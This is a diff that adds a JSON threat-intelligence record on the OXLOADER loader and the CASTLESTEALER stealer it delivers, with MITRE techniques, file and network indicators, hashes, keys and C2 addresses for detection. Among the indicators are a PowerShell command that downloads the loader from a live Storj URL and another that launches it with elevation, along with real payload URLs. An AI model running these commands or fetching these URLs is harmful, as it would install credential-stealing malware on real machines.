@@ -1,0 +1,505 @@
+{
+  "malware_family": "OXLOADER (loader) delivering CASTLESTEALER",
+  "threat_actor": "Unnamed Russian-speaking, financially motivated actor (CIS/Russian exclusions; Google Ads advertiser ВОЛОДИМИР ТЕРЕЩЕНКО)",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "OXLOADER is a previously undocumented Windows loader delivered through malicious Google Ads impersonating Node.js; it abuses the PE .reloc section and a new RWX .xtext section in a renamed copy of dui70.dll to stage shellcode, then bootstraps CASTLESTEALER in memory via Donut shellcode. It layers control-flow flattening, MBA/opaque predicates, self-modifying rolling-XOR decryption stubs and Adler-32 API hashing, plus anti-VM checks (WNetAddConnection2W emulation, CPU/RAM/refresh-rate thresholds) and CIS/Russian-language exclusions. Detection can key on the .reloc-resident shellcode bytes, the AFX_WM_DRAW2D clipboard-format call from the hijacked CRT initializer, the obf_xor_a1_with_a2_plus_33FDA routine and the CASTLESTEALER AES config key.",
+  "mitre_techniques": [
+    "T1583.008",
+    "T1608.001",
+    "T1204.002",
+    "T1059.001",
+    "T1548.002",
+    "T1027.013",
+    "T1140",
+    "T1027.009",
+    "T1036.005",
+    "T1574.002",
+    "T1497.001",
+    "T1614.001",
+    "T1620"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "unique_string",
+      "value": "obf_xor_a1_with_a2_plus_33FDA",
+      "context": "Bespoke decryption of strings/constants: a1 ^ (a2 + 0x33FDA), used with Adler-32 API hashing",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "AFX_WM_DRAW2D",
+      "context": "RegisterClipboardFormatW called by hijacked CRT initializer function 'fake_function' before decrypt_stub_1",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "*72s@1s",
+      "context": "Deliberately malformed resource for WNetAddConnection2W emulation check expecting ERROR_BAD_NAME (0x43)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "WNetAddConnection2W",
+      "context": "Resolved at runtime from mpr.dll; LastErrorValue read via TEB, requires ERROR_BAD_NET_NAME 0x43",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x0d1e0301",
+      "context": "Adler-32 API hash of HeapFree computed as obf_xor_a1_with_a2_plus_33FDA(0xB74683, 0xDA605A8) for ResolveAPIByHash",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "Adler-32",
+      "hash_value": "0x0d1e0301"
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x1a1e047a",
+      "context": "Adler-32 API hash of ExitProcess computed as obf_xor_a1_with_a2_plus_33FDA(0xB74281, 0x1AA60721)",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "Adler-32",
+      "hash_value": "0x1a1e047a"
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x28b90575",
+      "context": "Adler-32 API hash of CreateProcessA computed as obf_xor_a1_with_a2_plus_33FDA(0x1FD4283, 0x2941081C)",
+      "specificity": "high",
+      "evidence": "hash_gated",
+      "origin_tool": "",
+      "hash_algo": "Adler-32",
+      "hash_value": "0x28b90575"
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\System32\\dui70.dll",
+      "context": "Legitimate DirectUI engine DLL copied to a temp location under a random .ocx name",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\jim\\AppData\\Local\\Temp\\PFHemkxVk.ocx",
+      "context": "Randomly named copy of dui70.dll with added .xtext section, loaded via LoadLibraryA",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": ".xtext",
+      "context": "New RWX section created in the OCX copy to receive .reloc shellcode; PE-bear view shows '.xtest'",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": ".reloc",
+      "context": "Legitimate relocation section abused to house malicious shellcode instead of IMAGE_BASE_RELOCATION entries",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ E8 5C 74 09 00 4D 0F 46 F6 EB 05 87 57 71 9B 8D }",
+      "context": "First 16 bytes of shellcode stored inside the .reloc section of aBsvwbdas.exe (PE-bear hex view)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "6E0A1F8F77F7011561F6F9CA96B71B8F",
+      "context": "Chaskey-LTS (LTS) key used in CTR mode to decrypt Donut shellcode's embedded config and execution context",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "956C6128E9362E075F8D006C93616A66",
+      "context": "Chaskey-LTS CTR-mode IV used to decrypt the Donut loader config",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 12 33 56 78 3A B2 D3 A1 0F ED CB A9 17 9A 43 24 }",
+      "context": "16-byte AES key for C2 communications shared by CASTLESTEALER samples, found between 0xDEADBEEF markers",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "EF BE AD DE EF BE AD DE",
+      "context": "0xDEADBEEF markers delimiting the CASTLESTEALER config record that holds the AES key",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "CMake is re-running because generate.stamp.list could not be read.\\n",
+      "context": "Decoy CMake string passed as argument in second OXLOADER variant masquerading as benign CMake code",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ole32;oleaut32;wininet;mscoree;shell32",
+      "context": "Donut shellcode module list referenced during bootstrap (rdi+240)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Donut",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "CIS GEOID exclusion list (0x5, 0x7, 0x1d, 0x89, 0x82, 0x98, 0xcb, 0xe4, 0xf7, 0xee)",
+      "context": "Hardcoded CIS country GEOIDs compared against GetUserGeoID(GEOCLASS_NATION) result; values deobfuscated at runtime",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x419",
+      "context": "Russian (Russia) LANGID compared against GetUserDefaultUILanguage result; execution aborts on match",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x52C4A6DD",
+      "context": "state_id immediate assigned in the Russian-language exclusion branch (figure 22)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0x2E958830BE974D7F",
+      "context": "64-bit constant used in the CPU-count (NumberOfProcessors) anti-sandbox check; threshold >= 3 CPUs",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0xE875168A",
+      "context": "state_id assigned when the queried display refresh rate is below the 20 Hz threshold",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://link.storjshare.io/raw/jwwvr4oskkkjsegvt774ta62ehya/ruslan/aBsvvbdas.exe', '%DEST_DIR%\\%APP_NAME%')\"",
+      "context": "Embedded in BATPackageBuilderSetup.bat to download OXLOADER; parent cmd.exe running the batch",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -Command \"Start-Process -FilePath '%DEST_DIR%\\%APP_NAME%' -Verb RunAs\"",
+      "context": "Batch script launches OXLOADER elevated, triggering a UAC prompt; parent cmd.exe",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\WINDOWS\\system32\\cmd.exe /c \"C:\\Users\\ \\Downloads\\BATpackageBuilderSetup.bat\"",
+      "context": "Command line seen in Elastic Defend alerts when the batch downloader executes",
+      "specificity": "low",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Program Files (x86)\\Common Files\\VAudio\\Interop.exe\" /delayfix",
+      "context": "Masqueraded process observed in Elastic Defend alert; CLR loaded from suspicious memory",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Common Files\\VAudio\\Interop.exe",
+      "context": "Masquerading install path of the .NET payload launched from %TEMP%",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "set \"RND=%RANDOM%_%RANDOM%\"",
+      "context": "Batch script builds randomized temp dir and exe name (%TEMP%\\%RND%, %RND%.exe) before dropping OXLOADER",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Installation Wizard",
+      "context": "Fake installer window title used by the batch script (title Installation Wizard, color 1F, cols=60 lines=15)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "BATPackageBuilderSetup.bat",
+      "context": "First-stage batch downloader/launcher hosted on Storj",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "BATPackageBulderSetup.bat",
+      "context": "Variant batch name with typo for 'Builder'",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "aBsvwbdas.exe",
+      "context": "OXLOADER payload downloaded by the batch script (figure shows aBsvvbdas.exe in the URL)",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "node-v24.15.0-x64-86.exe",
+      "context": "Second OXLOADER variant masquerading as a Node.js installer",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "apimonitor-x64.exe",
+      "context": "First OXLOADER variant masquerading as API Monitor from rohitab.com",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "mpr.dll",
+      "context": "Plaintext library name passed to LoadLibraryA before the WNetAddConnection2W check",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "node-js.prentiva99.info",
+      "context": "Malicious Google Ads landing page impersonating a Node.js deployment platform",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "app.miloyannopoulos.com",
+      "context": "Redirector returning 302 Location headers to Storj-hosted payloads",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://app.miloyannopoulos.com/download?subid1=download",
+      "context": "Redirector endpoint that answered 302 Found to the payload URL",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://link.storjshare.io/raw/jux4e4ky5mruo4jkxsssp42sau4q/ruslan/BATPackageBuilderSetup.bat",
+      "context": "Storj-hosted first-stage batch script abused to evade domain reputation filtering",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://link.storjshare.io/raw/jwwvr4oskkkjsegvt774ta62ehya/ruslan/aBsvvbdas.exe",
+      "context": "OXLOADER executable URL hardcoded in the batch script (figure transcript)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://link.storjshare.io/raw/jv5uebuqwzfpmtahj34q753ptykq/node/BATPackageBulderSetup.bat",
+      "context": "Randomly chosen Location header from the redirector on 2026-05-13",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://link.storjshare.io/raw/jvsmdybqmvwep2oawbobp6ub7aza/node/node-v24.15.0-x64-86.exe",
+      "context": "Randomly chosen Location header delivering the second OXLOADER variant",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://link.storjshare.io/raw/jwoysr657iapcl3td4eqhpn3m2ua/node/node-v24.15.0-x64-86.exe",
+      "context": "Payload URL embedded in the second batch script (node lure theme)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://link.storjshare.io/raw/jwvr4o5kkkjgevt774ta62ehya/russian8asvmbdas.exe",
+      "context": "Download URL observed in Elastic Defend 'Suspicious PowerShell Execution' alert (defanged as hxxps:// in alert)",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "89.124.95.161",
+      "context": "CASTLESTEALER C2",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "89.124.115.82",
+      "context": "CASTLESTEALER C2",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "fdfc7831e5c24cfa80152860dfe8c056ba079f7df1393bf6bb7b18ed974eda37",
+      "description": "BATPackageBuilderSetup.bat - OXLOADER downloader & launcher batch script"
+    },
+    {
+      "sha256": "de4f51649ec1a33071854aefe93ffb3fc225e19f802d8dd914676dd5dfef2615",
+      "description": "BATPackageBulderSetup.bat - OXLOADER downloader & launcher batch script (typo variant)"
+    },
+    {
+      "sha256": "9a9939dff297997732aaade9b243d695632cbd64033c5fbcb9de3d09b7e6c28d",
+      "description": "apimonitor-x64.exe - OXLOADER masquerading as API Monitor"
+    },
+    {
+      "sha256": "c85f2765a6c3c3f3907c17e57df12f8f68826f74bff3bbfd272af50666d065fe",
+      "description": "node-v24.15.0-x64-86.exe - OXLOADER masquerading as Node.js installer"
+    },
+    {
+      "sha256": "4ec9d9d4d10ad78fc6d7bda7cb17d52984878ccd2dd4302fd1cef152313b9741",
+      "description": "CASTLESTEALER payload"
+    },
+    {
+      "sha256": "39019279686c820c3af5684012a0085a7e2109f612c9fab886dd0577ace5b5c6",
+      "description": "CASTLESTEALER payload"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
